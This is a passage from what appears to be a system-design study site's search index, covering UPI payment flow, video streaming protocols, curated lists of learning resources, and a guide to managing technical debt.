NPCI to participate in UPI. They act as Payment Service Providers (PSPs).</p> </li> <li> <p>Third-party Apps (PSPs):     Apps like Google Pay, PhonePe, Paytm act as customer-facing interfaces but must partner with banks to access UPI.</p> </li> </ul>"},{"location":"system-design/high-level/desgining/upi-payments/#upi-flow-simplified","title":"UPI Flow (Simplified)","text":"<ol> <li>User initiates payment via a UPI-enabled app using VPA.</li> <li>App communicates with partner bank (PSP) to initiate the transaction.</li> <li>Bank interacts with NPCI to route the transaction to the recipient's bank.</li> <li>NPCI validates and settles the transaction in real-time.</li> <li>Confirmation is sent back to both sender and receiver.</li> </ol>"},{"location":"system-design/high-level/desgining/upi-payments/#security","title":"Security","text":"<ul> <li>UPI transactions are secured by multi-factor authentication (e.g., device binding, UPI PIN).</li> <li>Only authorized apps and banks can access the UPI APIs.</li> </ul> <p>Summary: UPI revolutionizes payments in India by providing a unified, secure, and real-time payment interface, abstracting complex bank details and enabling seamless peer-to-peer and merchant transactions.</p>"},{"location":"system-design/high-level/desgining/vercel/","title":"Design a system like Vercel","text":""},{"location":"system-design/high-level/desgining/vercel/#youtube","title":"Youtube","text":"<ul> <li> <p>Code along - I built Vercel in 4 Hours (System Design, AWS, Redis, S3)</p> <ul> <li>Vercel Clone Code Review - Pass or Fail? | Hindi</li> </ul> </li> <li> <p>I built Vercel in 2 Hours (System Design, AWS, Docker, Redis, S3)</p> <ul> <li>Firse Vercel Code Review - PART 2</li> </ul> </li> <li> <p>I Built Vercel in 2 Hours (Kafka, ClickHouse, Postgres) | Log Collection and Pipeline</p> </li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/","title":"Design a Video Streaming Platform (Youtube)","text":""},{"location":"system-design/high-level/desgining/video-streaming/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/desgining/video-streaming/#introduction","title":"Introduction","text":"<ul> <li>Design a Video Streaming Protocol (HLS, DASH) | System Design</li> <li>How Video Streaming Works on Scale - System Design</li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/#video-streaming-internals","title":"Video Streaming internals","text":"<ul> <li>HLS Adaptive Bitrate Streaming - System Design</li> <li>piyushgarg-dev/hls-streaming</li> <li>How I Built Video Transcoding Service From Scratch | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/#design-youtube","title":"Design youtube","text":"<ul> <li>System Design: Design YouTube</li> <li>Design Youtube - System Design Interview</li> <li>System Design Interview: Design YouTube w/ a Ex-Meta Staff Engineer</li> <li>Master Youtube System Design</li> <li>Video Streaming &amp; Sharing Service (YouTube) - System Design Interview Question</li> <li>5: Netflix + YouTube | Systems Design Interview Questions With Ex-Google SWE</li> <li>YouTube High Level System Design with @harkirat1 !!</li> <li>Netflix System Design | YouTube System Design | System Design Interview Question</li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/#theory","title":"Theory","text":""},{"location":"system-design/high-level/desgining/video-streaming/#common-streaming-protocols","title":"Common Streaming Protocols","text":"<ul> <li>RTMP (Real-Time Messaging Protocol): Created by Adobe, commonly used for ingesting live streams from broadcasters to servers.</li> <li>RTSP (Real-Time Streaming Protocol): Developed by RealNetworks, used for establishing and controlling media sessions between endpoints.</li> <li>HLS (HTTP Live Streaming): Developed by Apple, segments video into small chunks and uses an index file (<code>.m3u8</code>) to store metadata about available streams and resolutions.</li> <li>MPEG-DASH (Dynamic Adaptive Streaming over HTTP): An open standard similar to HLS, uses a manifest file (<code>.mpd</code>) to describe available content and bitrates.</li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/#adaptive-bitrate-streaming","title":"Adaptive Bitrate Streaming","text":"<ul> <li>Video is transcoded into multiple resolutions and bitrates.</li> <li>Each version is split into small chunks (e.g., 2-10 seconds).</li> <li>The client downloads the index/manifest file and selects the appropriate chunk based on current network conditions, enabling smooth playback with minimal buffering.</li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/#video-processing","title":"Video Processing","text":"<ul> <li>Transcoding: Tools like FFmpeg are used to convert uploaded videos into multiple formats and resolutions.</li> <li>Chunking: Videos are divided into small segments for adaptive streaming.</li> <li>Storage: Chunks and manifest files are stored on CDN or object storage for efficient delivery.</li> </ul>"},{"location":"system-design/high-level/desgining/video-streaming/#key-concepts","title":"Key Concepts","text":"<ul> <li>Manifest/Index Files: (<code>.m3u8</code> for HLS, <code>.mpd</code> for DASH) list available video qualities and chunk locations.</li> <li>CDN (Content Delivery Network): Distributes video chunks closer to users for low-latency streaming.</li> <li>Player Logic: The video player dynamically switches between different quality streams based on real-time bandwidth measurements.</li> </ul> <p>Summary: Modern video streaming platforms like Youtube use adaptive bitrate streaming with protocols such as HLS and MPEG-DASH. Videos are transcoded, chunked, and delivered via CDN, allowing seamless playback across varying network conditions.</p>"},{"location":"system-design/high-level/desgining/vpn/","title":"Design a VPN","text":""},{"location":"system-design/high-level/desgining/vpn/#youtube","title":"Youtube","text":"<ul> <li>Build Your Own VPN | Free VPN</li> </ul>"},{"location":"system-design/high-level/desgining/webhook/","title":"Design Webhook","text":""},{"location":"system-design/high-level/desgining/webhook/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design a Webhook Service w/ a Google Engineer</li> </ul>"},{"location":"system-design/high-level/desgining/yelp/","title":"Yelp","text":""},{"location":"system-design/high-level/desgining/yelp/#website","title":"Website","text":"<ul> <li>Design a Local Business Review Site Like Yelp</li> </ul>"},{"location":"system-design/high-level/desgining/yelp/#youtube","title":"Youtube","text":"<ul> <li>FAANG System Design Interview: Design A Location Based Service (Yelp, Google Places)</li> <li>9: Design Yelp/Google Places | Systems Design Interview Questions With Ex-Google SWE</li> <li>Design Yelp, Meta Staff Product Architecture: Hello Interview Mock</li> </ul>"},{"location":"system-design/high-level/links/udemy/","title":"Udemy","text":""},{"location":"system-design/high-level/links/udemy/#alexey-soshin","title":"Alexey Soshin","text":"<ul> <li>Pragmatic System Design</li> </ul>"},{"location":"system-design/high-level/links/udemy/#sandeep-kaul-tech-lead-facebook","title":"Sandeep Kaul | Tech Lead @ Facebook","text":"<ul> <li>System Design Interview Guide for Software Architecture</li> </ul>"},{"location":"system-design/high-level/links/udemy/#newtechways-anurag-yadav","title":"NewTechWays - Anurag Yadav","text":"<ul> <li>Software Architecture &amp; Technology of Large-Scale Systems</li> <li>Implementing Software Architecture of a Large-Scale System</li> </ul>"},{"location":"system-design/high-level/links/udemy/#prateek-narang-sr-software-engineer-google","title":"Prateek Narang Sr. Software Engineer Google","text":"<ul> <li>Low Level System Design, Design Patterns &amp; SOLID Principles</li> </ul>"},{"location":"system-design/high-level/links/udemy/#rahul-rajat-singh","title":"Rahul Rajat Singh","text":"<ul> <li>Mastering System Design: From Basics to Cracking Interviews</li> <li>Mastering Microservices Architecture and Design Patterns</li> </ul>"},{"location":"system-design/high-level/links/udemy/#michael-pogrebinsky-software-architecture-system-design-java-expert","title":"Michael Pogrebinsky | Software Architecture, System Design, Java Expert","text":"<ul> <li>Software Architecture &amp; Design of Modern Large Scale Systems</li> <li>The Complete Microservices &amp; Event-Driven Architecture</li> <li>Software Architecture &amp; System Design Practical Case Studies</li> <li>The Complete Cloud Computing Software Architecture Patterns</li> <li>Software Architecture &amp; System Design - Practice Tests</li> </ul>"},{"location":"system-design/high-level/links/websites/","title":"Websites","text":""},{"location":"system-design/high-level/links/websites/#courses-ans-websites","title":"Courses ans websites","text":"<ul> <li>Hello Interview</li> <li>System Design Primer</li> <li>codeWithAryan</li> <li>System Design Roadmap with Videos for SDEs</li> <li>Awesome Software Architecture</li> </ul>"},{"location":"system-design/high-level/links/websites/#blogs-and-newsletters","title":"Blogs and newsletters","text":"<ul> <li>blog.algomaster.io</li> <li>How to Answer a System Design Interview Problem</li> <li>How I Mastered System Design Interviews</li> <li> <p>ashishps1/awesome-system-design-resources</p> </li> <li> <p>ByteByteGo Newsletter</p> </li> <li>ByteByteGo courses</li> <li> <p>Engineering Visual Guides</p> </li> <li> <p>The Polymathic Engineer</p> </li> <li>The System Design Newsletter</li> <li>Hacking Scale by Better Stack</li> <li> <p>System Design Classroom</p> </li> <li> <p>eraser.io/decision-node</p> </li> </ul>"},{"location":"system-design/high-level/links/websites/#freecodecamp","title":"freecodecamp","text":"<ul> <li>The Microservices Book - Learn How to Build and Manage Services in the Cloud</li> <li>Learn Software Design Basics: Key Phases and Best Practices</li> <li>How to Design Structured Database Systems Using SQL [Full Book]</li> </ul>"},{"location":"system-design/high-level/links/websites/#devio","title":"DEV.io","text":"<ul> <li>The Complete Guide to System Design in 2026</li> </ul>"},{"location":"system-design/high-level/links/websites/#linked-in","title":"Linked-In","text":"<ul> <li>30 Blogs to Learn 30 System Design Fundamentals</li> <li>30 Blogs to Learn 30 System Design Concepts</li> <li>System Design was HARD until I Learned these 30 Concepts</li> <li>\ud835\udfef\ud835\udfec \ud835\uddd5\ud835\uddf9\ud835\uddfc\ud835\uddf4\ud835\ude00 \ud835\ude01\ud835\uddfc \ud835\udddf\ud835\uddf2\ud835\uddee\ud835\uddff\ud835\uddfb \ud835\udfef\ud835\udfec \ud835\udde6\ud835\ude06\ud835\ude00\ud835\ude01\ud835\uddf2\ud835\uddfa \ud835\uddd7\ud835\uddf2\ud835\ude00\ud835\uddf6\ud835\uddf4\ud835\uddfb \ud835\uddd6\ud835\uddfc\ud835\uddfb\ud835\uddf0\ud835\uddf2\ud835\uddfd\ud835\ude01\ud835\ude00:</li> <li> <p>9 Software Design Principles Every Developer Should Know</p> </li> <li> <p>Still asking \"how to start system design\"</p> </li> <li>Caching Mega Thread !</li> <li>If I had only 1 week to revise for coding interviews, these are the 35 problems I'd solve.</li> <li>Alex Xu</li> </ul>"},{"location":"system-design/high-level/links/websites/#medium","title":"Medium","text":""},{"location":"system-design/high-level/links/websites/#individuals","title":"Individuals","text":"<ul> <li>Shivam Srivastava<ul> <li>Interview Experiences and Learnings</li> </ul> </li> <li>Pudari Madhavi</li> <li>ByteByteBoot</li> <li>Agil</li> <li>Soma</li> <li>Oleksandr Klymenko</li> <li>Ali Zeynalli</li> <li>Mohamed Enn</li> <li>SureshR</li> <li>Shubham Kumbhar</li> <li>Cesar Aguirre</li> <li>Martin Hodges</li> <li>The Abstract Engineer</li> </ul>"},{"location":"system-design/high-level/links/websites/#channels","title":"Channels","text":"<ul> <li>ScalaBrix</li> <li>Career Drill</li> <li>javarevisited</li> <li>Java Interview</li> <li>Lets Learn Now</li> <li>AKCoding.com</li> <li>Byte Wise 010</li> <li>Medium Tech Articles</li> <li>Level Up Coding</li> <li>TheSystemDesign</li> </ul>"},{"location":"system-design/high-level/links/websites/#topics","title":"Topics","text":"<ul> <li>General Coding Knowledge</li> <li>Coding &amp; Development</li> </ul>"},{"location":"system-design/high-level/links/websites/#github","title":"Github","text":""},{"location":"system-design/high-level/links/websites/#system-design","title":"System Design","text":"<ul> <li>donnemartin/system-design-primer</li> <li>binhnguyennus/awesome-scalability</li> <li>System Design Interview - An Insider's Guide (vol 1 &amp; 2)</li> <li>javabuddy/best-system-design-resources</li> <li>mehdihadeli/awesome-software-architecture</li> <li>Software Engineering Blogs</li> </ul>"},{"location":"system-design/high-level/links/websites/#build-something","title":"Build something","text":"<ul> <li>Build your own x <li>The Algorithms</li> <li>roadmap.sh</li> <li>Developer Roadmaps</li> <li>Papers We Love</li> <li>awesome</li>"},{"location":"system-design/high-level/links/websites/#free-and-open-source","title":"Free and open source","text":"<ul> <li>sdmg15/Best-websites-a-programmer-should-visit</li> <li>free-for.dev</li> <li>List of Free Learning Resources In Many Languages</li> <li>free-programming-books</li> <li>Try Public APIs for free</li> <li>API Layer</li> <li>Open source alternatives</li> <li>Open Source Society University</li> </ul>"},{"location":"system-design/high-level/links/websites/#ai","title":"AI","text":"<ul> <li>Build a Large Language Model (From Scratch)</li> <li>Machine Learning From Scratch</li> <li>Made With ML</li> </ul>"},{"location":"system-design/high-level/links/youtube/","title":"Youtube","text":""},{"location":"system-design/high-level/links/youtube/#short-videos","title":"Short videos","text":"<ul> <li>Why I focus on patterns instead of technologies</li> <li>Adding a cache is not as simple as it may seem...</li> <li>5 Types of Testing Software Every Developer Needs to Know!</li> <li>Lets Chat About Unit Tests</li> <li>Thoughts About Unit Testing | Prime Reacts</li> <li>When To Unit, E2E, And Integration Test</li> <li>The cloud is over-engineered and overpriced</li> <li>5 System Design Misconceptions Even Senior Engineers Make</li> <li>6 Backend Mistakes Keeping You Stuck at Junior Level</li> <li>How is this Website so fast!?</li> </ul>"},{"location":"system-design/high-level/links/youtube/#single-videos","title":"Single videos","text":""},{"location":"system-design/high-level/links/youtube/#roadmaps-and-topics","title":"Roadmaps and topics","text":"<ul> <li>System design is actually easy...</li> <li>I ACED my Technical Interviews knowing these System Design Basics</li> <li>How to Prepare for System Design Interviews w/ Meta Staff Engineer Chek the description links</li> <li>System Design was HARD until I Learned these 30 Concepts</li> <li>How to Master System Design (Step-by-Step for FAANG-Level Interviews)</li> <li>Step-by-Step Roadmap to Mastering System Design for Interviews</li> <li>Complete System Design Roadmap 2025 | HLD &amp; LLD by Shradha Ma'am</li> </ul>"},{"location":"system-design/high-level/links/youtube/#system-design-crash-course","title":"System Design Crash Course","text":"<ul> <li> <p>Master Microservices &amp; Event-Driven Architecture: Complete 6-Hour Guide for Beginners to Advanced</p> </li> <li> <p>System Design Explained APIs, Databases, Caching, CDNs, Load Balancing &amp; Production Infra</p> </li> <li>System Design</li> <li>System Design for Beginners</li> <li>System Design Crash Course - Part 2</li> <li>How to Design APIs Like a Senior Engineer (REST, GraphQL, Auth, Security)</li> <li>Systems Design in an Hour</li> <li> <p>Learn High-Level System Design by Coding YouTube - Full Course</p> <ul> <li>keertipurswani/HHLD-YouTube</li> </ul> </li> <li> <p>Introduction to System Design | Fundamental of System Design | How to Crack System Design</p> </li> <li> <p>Become PRO at Backend and System Design</p> </li> <li> <p>Backend Scaling and Performance Engineering: Part-1</p> </li> <li> <p>System Design Concepts Course and Interview Prep</p> </li> <li> <p>How to Crack Any System Design Interview | Scalable System Design</p> </li> <li> <p>7 System Design Concepts Explained in 10 Minutes</p> </li> <li>20 System Design Concepts You Must Know - Final Part</li> <li>System Design Interview - BIGGEST Mistakes to Avoid</li> <li> <p>Scalability Simply Explained in 10 Minutes</p> </li> <li> <p>Build backends like a senior engineer - Here's how</p> </li> </ul>"},{"location":"system-design/high-level/links/youtube/#channels-and-playlists","title":"Channels and Playlists","text":"<ul> <li>Concept &amp;&amp; Coding - by Shrayansh</li> <li>InterviewCodingPractise</li> <li>Hello Interview - SWE Interview Preparation</li> <li>sudoCODE</li> <li>ByteByteGo</li> <li>ByteMonk</li> <li>Arpit Bhayani</li> <li>Jordan has no life</li> <li>TechPrep</li> <li>Piyush Garg</li> <li> <p>Exponent</p> </li> <li> <p>Mehul - Codedamn</p> <ul> <li>Backend 2026 Roadmap: Everything you need to know</li> <li>Doing system design engineering like senior backend developers</li> <li>How to design APIs like a senior engineer</li> <li>Web Application Firewall - Complete Guide</li> <li>You're using JWT the wrong way</li> </ul> </li> </ul>"},{"location":"system-design/high-level/links/youtube/#other-channels","title":"Other Channels","text":"<ul> <li>System Design School</li> <li>Himanshu Goyal</li> <li>Interview Pen</li> <li>Think Software</li> <li>Kiki's Bytes</li> <li> <p>Martin Kleppmann</p> </li> <li> <p>Cloud With Raj</p> </li> <li>Gaurav Sen</li> <li>System Design Playlist</li> <li>Tushar Roy - Coding Made Simple</li> <li>System Design</li> <li>Scortier</li> </ul>"},{"location":"system-design/high-level/links/youtube/#other-playlist","title":"Other Playlist","text":"<ul> <li>High Level Design from Basics to Advanced</li> <li>System Design Roadmap: Database | Networking | Load Balancing | Scalability</li> <li>System Design Concepts You NEED to Know</li> </ul>"},{"location":"system-design/low-level/","title":"Low Level System Design","text":""},{"location":"system-design/low-level/#blogs-websites","title":"Blogs &amp; Websites","text":"<ul> <li>ashishps1/awesome-low-level-design<ul> <li>Learn Low-Level Design Systematically</li> </ul> </li> </ul>"},{"location":"system-design/low-level/#youtube","title":"Youtube","text":""},{"location":"system-design/low-level/#single-videos","title":"Single videos","text":"<ul> <li>5 Design Patterns That Are ACTUALLY Used By Developers</li> <li>10 Design Patterns Explained in 10 Minutes</li> <li>5 Design Patterns Every Engineer Should Know</li> <li>Design Patterns | Daily Code Buffer</li> <li>The Absolute Best Intro to Monads For Software Engineers</li> <li> <p>Design Patterns Revisited in Modern Java by Venkat Subramaniam</p> </li> <li> <p>This one change will make your code better...</p> </li> </ul>"},{"location":"system-design/low-level/#playlist","title":"Playlist","text":"<ul> <li>Low Level Design from Basics to Advanced</li> <li>Low Level Design - Basics to Advance 2025</li> <li>Low Level Design</li> <li>Low Level Designing</li> <li>Low Level Design Primer Course</li> <li>LLD / Machine Coding - Important Concepts Made Easy | Detailed Examples with Code | Low Level System Design | Important for Interviews</li> <li>Grokking the System Design Interviews</li> <li>System Design - Low Level</li> <li>Low Level Design Course<ul> <li>Low Level Design</li> </ul> </li> <li>Low Level System Design</li> </ul>"},{"location":"system-design/low-level/#channels","title":"Channels","text":"<ul> <li>Think Software</li> </ul>"},{"location":"system-design/low-level/concepts/hashmap/","title":"Implement a hashmap","text":""},{"location":"system-design/low-level/concepts/hashmap/#youtube","title":"Youtube","text":"<ul> <li>12. Hashmap Internal Implementation in java (Hindi) | Implementing your HashMap in Java</li> </ul>"},{"location":"system-design/low-level/concepts/solid-principles/","title":"SOLID Principles","text":""},{"location":"system-design/low-level/concepts/solid-principles/#youtube","title":"Youtube","text":"<ul> <li>1. SOLID Principles with Easy Examples (Hindi) | OOPs SOLID Principles - Low Level Design</li> <li>1.1 Liskov Substitution Principle (LSP) with Solution in Java - SOLID Principles of Low Level Design</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/","title":"How to Handle Technical Debt","text":""},{"location":"system-design/low-level/concepts/technical-debt/#youtube","title":"YouTube","text":"<ul> <li>Everything You NEED to Know About TECH DEBT</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#theory","title":"Theory","text":"<p>Technical debt is one of the most critical challenges in software development that can make or break a project's long-term success. Understanding how to identify, measure, and manage it effectively is essential for maintaining healthy codebases and sustainable development practices.</p>"},{"location":"system-design/low-level/concepts/technical-debt/#complete-guide-to-technical-debt-management","title":"Complete Guide to Technical Debt Management","text":""},{"location":"system-design/low-level/concepts/technical-debt/#what-is-technical-debt","title":"What Is Technical Debt?","text":"<p>Technical debt occurs when development teams take shortcuts to deliver features faster in the short term, knowing these decisions will create additional work and complexity later. It's important to understand that technical debt isn't inherently negative\u2014sometimes it's a strategic business decision that enables faster time-to-market.</p>"},{"location":"system-design/low-level/concepts/technical-debt/#martin-fowlers-technical-debt-quadrant","title":"Martin Fowler's Technical Debt Quadrant","text":"<p>Martin Fowler categorizes technical debt into four distinct types:</p> <ul> <li>Deliberate &amp; Prudent: Conscious, strategic decisions made with full awareness of trade-offs<ul> <li>Example: \"We need to ship this feature for the product launch, we'll refactor the payment system next quarter\"</li> </ul> </li> <li>Deliberate &amp; Reckless: Rushed choices made knowingly at the expense of system quality<ul> <li>Example: \"We don't have time for design, just make it work\"</li> </ul> </li> <li>Inadvertent &amp; Prudent: Discovering better approaches after gaining new knowledge or experience<ul> <li>Example: \"Now we know how we should have built this feature\"</li> </ul> </li> <li>Inadvertent &amp; Reckless: Mistakes resulting from inexperience, lack of skills, or poor practices<ul> <li>Example: \"What's layering?\" or ignoring established coding standards</li> </ul> </li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#the-financial-analogy","title":"The Financial Analogy","text":"<p>Technical debt operates like a financial loan: - Principal: The shortcut or quick fix implemented - Interest: The ongoing cost of maintaining, debugging, and working around the debt - Compound Interest: How the cost grows exponentially if left unaddressed</p>"},{"location":"system-design/low-level/concepts/technical-debt/#real-world-impact-and-costs","title":"Real-World Impact and Costs","text":""},{"location":"system-design/low-level/concepts/technical-debt/#development-velocity-impact","title":"Development Velocity Impact","text":"<ul> <li>Time Allocation: Teams typically spend 23-42% of their development time addressing technical debt</li> <li>Velocity Reduction: Development speed decreases proportionally to debt accumulation</li> <li>Feature Delivery: New feature development slows as developers navigate increasingly complex codebases</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#financial-impact","title":"Financial Impact","text":"<ul> <li>Budget Allocation: IT organizations typically allocate 20-40% of their budget to technical debt management</li> <li>Opportunity Cost: Resources spent on debt remediation could otherwise be used for new features</li> <li>Compound Growth: Like financial interest, technical debt costs grow exponentially when ignored</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#business-consequences","title":"Business Consequences","text":"<ul> <li>Increased production incidents and downtime</li> <li>Longer time-to-market for new features</li> <li>Higher onboarding costs for new team members</li> <li>Reduced ability to respond to market changes</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#managing-technical-debt","title":"Managing Technical Debt","text":""},{"location":"system-design/low-level/concepts/technical-debt/#the-8020-rule","title":"The 80/20 Rule","text":"<p>Principle: Allocate 80% of development effort to new features and 20% to maintenance and debt remediation.</p> <p>Benefits: - Maintains steady feature delivery - Prevents debt from accumulating unchecked - Keeps team velocity sustainable over time</p>"},{"location":"system-design/low-level/concepts/technical-debt/#shopifys-25-rule","title":"Shopify's 25% Rule","text":"<p>Structure: - Daily: 5-10 minutes of refactoring during regular development - Weekly: Team planning sessions to identify and prioritize debt - Monthly: Strategic meetings to address larger architectural issues</p> <p>Implementation: - Build debt remediation into daily workflows - Make small improvements continuously rather than large periodic overhauls - Align debt priorities with business objectives</p>"},{"location":"system-design/low-level/concepts/technical-debt/#dedicated-debt-sprints","title":"Dedicated Debt Sprints","text":"<p>Approach: Reserve entire sprints (typically every 6-8 weeks) for technical improvement.</p> <p>Activities: - Major refactoring initiatives - Infrastructure upgrades - Automated testing improvements - Performance optimizations - Documentation updates</p>"},{"location":"system-design/low-level/concepts/technical-debt/#prevention-strategies","title":"Prevention Strategies","text":""},{"location":"system-design/low-level/concepts/technical-debt/#development-practices","title":"Development Practices","text":"<ul> <li>Test-Driven Development (TDD): Write tests first to enforce good design and prevent poor code quality</li> <li>Pair Programming: Collaborative development helps catch shortcuts and knowledge transfer</li> <li>Code Reviews: Systematic review process to maintain quality standards</li> <li>Definition of Done: Include quality criteria in feature completion requirements</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#automation-and-quality-gates","title":"Automation and Quality Gates","text":"<ul> <li>Continuous Integration/Continuous Deployment (CI/CD): Automated pipelines with quality checks</li> <li>Static Code Analysis: Tools like SonarQube, ESLint, or Pylint to catch issues early</li> <li>Automated Testing: Unit, integration, and end-to-end tests to prevent regressions</li> <li>Performance Monitoring: Automated alerts for performance degradation</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#architectural-principles","title":"Architectural Principles","text":"<ul> <li>Design Patterns: Consistent architectural approaches for maintainable code</li> <li>SOLID Principles: Object-oriented design principles for flexible, maintainable systems</li> <li>Boy Scout Rule: Always leave code cleaner than you found it</li> <li>Documentation: Keep architecture decisions and system documentation current</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#measuring-and-tracking-debt","title":"Measuring and Tracking Debt","text":""},{"location":"system-design/low-level/concepts/technical-debt/#key-metrics","title":"Key Metrics","text":""},{"location":"system-design/low-level/concepts/technical-debt/#debt-ratio","title":"Debt Ratio","text":"<p>Formula: <code>Debt Ratio = Remediation Cost / Development Cost</code></p> <p>Example: If fixing technical debt in a system costs $100K and the system originally cost $500K to develop, the debt ratio is 20%.</p>"},{"location":"system-design/low-level/concepts/technical-debt/#code-quality-metrics","title":"Code Quality Metrics","text":"<ul> <li>Cyclomatic Complexity: Measure code complexity and maintainability</li> <li>Test Coverage: Percentage of code covered by automated tests</li> <li>Code Churn: Frequency of changes to code files</li> <li>Duplicate Code: Amount of repeated code across the codebase</li> <li>Technical Debt Hours: Estimated time to resolve identified issues</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#hotspot-analysis","title":"Hotspot Analysis","text":"<p>Pareto Principle Application: Often 80% of problems come from 20% of files.</p> <p>Prioritization Factors: - Business Impact: Components affecting critical user journeys - Change Frequency: Files that are modified often - Complexity: Areas with high cyclomatic complexity - Bug Density: Components with frequent defects - Developer Pain Points: Areas causing development friction</p>"},{"location":"system-design/low-level/concepts/technical-debt/#tracking-tools","title":"Tracking Tools","text":"<ul> <li>SonarQube: Comprehensive code quality and security analysis</li> <li>Code Climate: Automated code review and technical debt tracking</li> <li>CodeScene: Behavioral analysis of codebases</li> <li>NDepend: .NET-specific code analysis and debt calculation</li> <li>monday.com: Project management with technical debt tracking capabilities</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#prioritization-framework","title":"Prioritization Framework","text":""},{"location":"system-design/low-level/concepts/technical-debt/#decision-matrix","title":"Decision Matrix","text":"<p>Create a matrix evaluating components on multiple dimensions:</p> Component Business Value Technical Risk Effort Required Action Payment System High High Medium Refactor Legacy Reports Low Medium High Accept/Deprecate User Authentication High Medium Low Refactor Internal Tools Medium Low Low Minor Cleanup"},{"location":"system-design/low-level/concepts/technical-debt/#action-categories","title":"Action Categories","text":"<ul> <li>Refactor: High value, manageable effort</li> <li>Rewrite: Critical components with extensive debt</li> <li>Accept: Low impact debt that's expensive to fix</li> <li>Deprecate: Legacy components being phased out</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#risk-assessment-framework","title":"Risk Assessment Framework","text":"<ul> <li>Critical: Issues that could cause system failures or security vulnerabilities</li> <li>High: Problems significantly impacting development velocity or user experience</li> <li>Medium: Issues causing moderate friction but not blocking progress</li> <li>Low: Minor improvements that would be nice to have</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#communicating-with-non-technical-stakeholders","title":"Communicating with Non-Technical Stakeholders","text":""},{"location":"system-design/low-level/concepts/technical-debt/#business-language-translation","title":"Business Language Translation","text":"<ul> <li>Technical Debt \u2192 Accumulated maintenance costs</li> <li>Refactoring \u2192 System optimization for future development</li> <li>Code Quality \u2192 Foundation reliability and development speed</li> <li>Technical Risk \u2192 Business continuity and competitive advantage risk</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#quantifiable-impact-presentation","title":"Quantifiable Impact Presentation","text":"<ul> <li>Incident Rates: \"Technical debt in our payment system has increased customer-facing errors by 40%\"</li> <li>Feature Delivery: \"New checkout features now take 3x longer to implement due to system complexity\"</li> <li>Cost Analysis: \"Addressing this debt now costs $50K vs. $200K if we wait another year\"</li> <li>Competitive Impact: \"Competitors can ship similar features in 2 weeks while we need 6 weeks\"</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#communication-strategies","title":"Communication Strategies","text":"<ul> <li>Use visual dashboards showing debt trends over time</li> <li>Present concrete examples of how debt affects user experience</li> <li>Provide clear timelines for improvement with measurable milestones</li> <li>Connect technical improvements to business objectives</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#implementation-roadmap","title":"Implementation Roadmap","text":""},{"location":"system-design/low-level/concepts/technical-debt/#phase-1-assessment-and-foundation-weeks-1-4","title":"Phase 1: Assessment and Foundation (Weeks 1-4)","text":"<ol> <li> <p>Install Measurement Tools</p> <ul> <li>Set up SonarQube, Code Climate, or similar tools</li> <li>Configure quality gates in CI/CD pipeline</li> <li>Establish baseline metrics</li> </ul> </li> <li> <p>Identify Top Hotspots</p> <ul> <li>Analyze codebase for top 5-10 problem areas</li> <li>Calculate initial debt ratio</li> <li>Document current pain points and their business impact</li> </ul> </li> <li> <p>Team Training</p> <ul> <li>Educate team on technical debt concepts</li> <li>Establish coding standards and best practices</li> <li>Set up code review processes</li> </ul> </li> </ol>"},{"location":"system-design/low-level/concepts/technical-debt/#phase-2-quick-wins-weeks-5-8","title":"Phase 2: Quick Wins (Weeks 5-8)","text":"<ol> <li> <p>Address Low-Hanging Fruit</p> <ul> <li>Fix obvious code smells and duplications</li> <li>Add missing tests for critical paths</li> <li>Improve documentation for complex areas</li> </ul> </li> <li> <p>Implement Prevention Measures</p> <ul> <li>Start pair programming for complex features</li> <li>Introduce TDD for new development</li> <li>Set up automated linting and formatting</li> </ul> </li> </ol>"},{"location":"system-design/low-level/concepts/technical-debt/#phase-3-systematic-management-weeks-9-16","title":"Phase 3: Systematic Management (Weeks 9-16)","text":"<ol> <li> <p>Establish Debt Management Process</p> <ul> <li>Allocate 20% of sprint capacity to debt remediation</li> <li>Create debt backlog and prioritization system</li> <li>Set up regular debt review meetings</li> </ul> </li> <li> <p>Address High-Impact Items</p> <ul> <li>Tackle identified hotspots systematically</li> <li>Refactor critical components with high change frequency</li> <li>Improve test coverage for business-critical features</li> </ul> </li> </ol>"},{"location":"system-design/low-level/concepts/technical-debt/#phase-4-culture-and-continuous-improvement-ongoing","title":"Phase 4: Culture and Continuous Improvement (Ongoing)","text":"<ol> <li> <p>Foster Debt-Aware Culture</p> <ul> <li>Make debt discussions part of sprint planning</li> <li>Celebrate successful debt reduction efforts</li> <li>Include debt management in performance evaluations</li> </ul> </li> <li> <p>Continuous Monitoring and Adjustment</p> <ul> <li>Regular review of debt metrics and trends</li> <li>Adjust allocation percentages based on project needs</li> <li>Continuously communicate progress to stakeholders</li> </ul> </li> </ol>"},{"location":"system-design/low-level/concepts/technical-debt/#advanced-strategies","title":"Advanced Strategies","text":""},{"location":"system-design/low-level/concepts/technical-debt/#architectural-debt-management","title":"Architectural Debt Management","text":"<ul> <li>Strangler Fig Pattern: Gradually replace legacy systems with new implementations</li> <li>Branch by Abstraction: Introduce abstractions to isolate and replace problematic components</li> <li>Microservices Migration: Break monolithic applications into manageable services</li> </ul>"},{"location":"system-design/low-level/concepts/technical-debt/#automation-strategies","title":"Automation Strategies","text":"<ul> <li>Automated Code Cleanup: Tools that automatically fix simple issues</li> <li>Dependency Management: Automated updates and security patches</li> <li>Performance Regression Detection: Automated monitoring of performance metrics</li> 